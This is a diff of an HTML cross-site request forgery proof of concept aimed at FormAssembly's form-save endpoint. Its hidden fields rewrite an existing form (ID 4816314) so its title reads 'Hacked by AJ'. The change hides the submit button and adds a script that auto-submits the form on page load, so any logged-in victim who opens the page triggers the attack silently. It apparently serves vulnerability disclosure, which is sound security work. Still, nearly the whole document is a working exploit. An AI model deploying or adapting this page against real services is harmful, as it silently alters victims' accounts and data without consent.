@@ -1,14 +1,18 @@
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
-    <form action="https://app.formassembly.com/forms/save/" method="POST">
+    <form id="autosubmit" action="https://app.formassembly.com/forms/save/" method="POST">
       <input type="hidden" name="data&#91;Form&#93;&#91;name&#93;" value="Hacked&#32;by&#32;AJ" />
       <input type="hidden" name="data&#91;Form&#93;&#91;xml&#95;data&#93;" value="&lt;form&#32;name&#61;&quot;Hacked&#32;by&#32;AJ&quot;&#32;id&#61;&quot;4964375&quot;&#32;labelplacement&#61;&quot;labelsAbove&quot;&#32;fieldhintplacement&#61;&quot;hintsBelow&quot;&#32;showContactLink&#61;&quot;true&quot;&#32;contactLinkLabel&#61;&quot;Contact&#32;Information&quot;&#32;shouldResetContactLinkLabelOnTranslate&#61;&quot;true&quot;&#32;contactLink&#61;&quot;https&#58;&#47;&#47;www&#46;tfaforms&#46;com&#47;forms&#47;help&#47;4964375&quot;&#32;showGDPRLink&#61;&quot;false&quot;&#32;gdprLinkLabel&#61;&quot;Your&#32;Rights&#32;Under&#32;GDPR&quot;&#32;shouldResetGDPRLinkLabelOnTranslate&#61;&quot;true&quot;&#32;gdprLink&#61;&quot;https&#58;&#47;&#47;www&#46;formassembly&#46;com&#47;gdpr&#45;rights&quot;&#32;themeid&#61;&quot;68007&quot;&#32;css&#61;&quot;&#47;uploads&#47;themes&#47;theme&#45;68007&#46;css&quot;&#32;language&#61;&quot;en&#95;US&quot;&#32;dbFormId&#61;&quot;4964375&quot;&#32;builderversion&#61;&quot;5&#46;0&#46;0&quot;&gt;&lt;action&#32;type&#61;&quot;submit&quot;&#32;level&#61;&quot;primary&quot;&#32;label&#61;&quot;Submit&quot;&#47;&gt;&lt;title&#32;plain&#61;&quot;Hacked&#32;by&#32;AJ&quot;&gt;&lt;&#33;&#91;CDATA&#91;Hacked&#32;by&#32;AJ&#93;&#93;&gt;&lt;&#47;title&gt;&lt;htmlsection&#32;id&#61;&quot;tfa&#95;1&quot;&gt;&lt;&#33;&#91;CDATA&#91;&lt;h4&gt;Testing&#32;Only&#33;&lt;&#47;h4&gt;&#93;&#93;&gt;&lt;&#47;htmlsection&gt;&lt;&#47;form&gt;" />
       <input type="hidden" name="data&#91;Form&#93;&#91;builder&#95;version&#93;" value="5&#46;0&#46;0" />
       <input type="hidden" name="data&#91;Form&#93;&#91;language&#93;" value="en&#95;US" />
       <input type="hidden" name="data&#91;Form&#93;&#91;content&#95;repo&#93;" value="" />
       <input type="hidden" name="data&#91;Form&#93;&#91;id&#93;" value="4816314" />
-      <input type="submit" value="Submit request" />
+      <input type="submit" hidden value="Submit request" />
     </form>
+    
+    <script>
+ document.getElementById("autosubmit").submit();
+</script>
   </body>
 </html>
